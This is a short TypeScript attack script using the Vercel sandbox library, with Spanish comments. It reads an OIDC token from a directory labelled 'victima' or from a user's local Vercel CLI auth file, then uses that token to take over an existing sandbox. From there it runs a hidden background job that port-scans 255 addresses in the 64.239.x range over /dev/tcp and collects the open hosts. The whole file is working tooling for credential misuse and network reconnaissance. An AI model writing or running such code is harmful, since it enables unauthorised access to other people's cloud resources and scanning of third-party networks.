import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
async function main() {
  const s = await Sandbox.get({ name: "scan2-1787253957084", token: VICTIM, teamId, projectId });
  // correr scan en background, guardar en archivo
  const bg = `
set +e
nohup bash -c 'for i in $(seq 1 255); do ip=64.239.$i.1; if timeout 1 bash -c "timeout 0.8 bash -c \"echo > /dev/tcp/\"$ip\"/443\" 2>/dev/null"; then echo OPEN 64.239.$i.0/24 >> /tmp/scanres.txt; fi; done; echo SCANDONE >> /tmp/scanres.txt' >/dev/null 2>&1 &
echo "bg started pid=$!"
`;
  await s.runCommand("bash", ["-c", bg], { wait: true, timeout: 15_000 });
  // esperar 40s
  await new Promise((r) => setTimeout(r, 40000));
  const r = await s.runCommand("bash", ["-c", "cat /tmp/scanres.txt 2>/dev/null; echo END"], { wait: true, timeout: 15_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
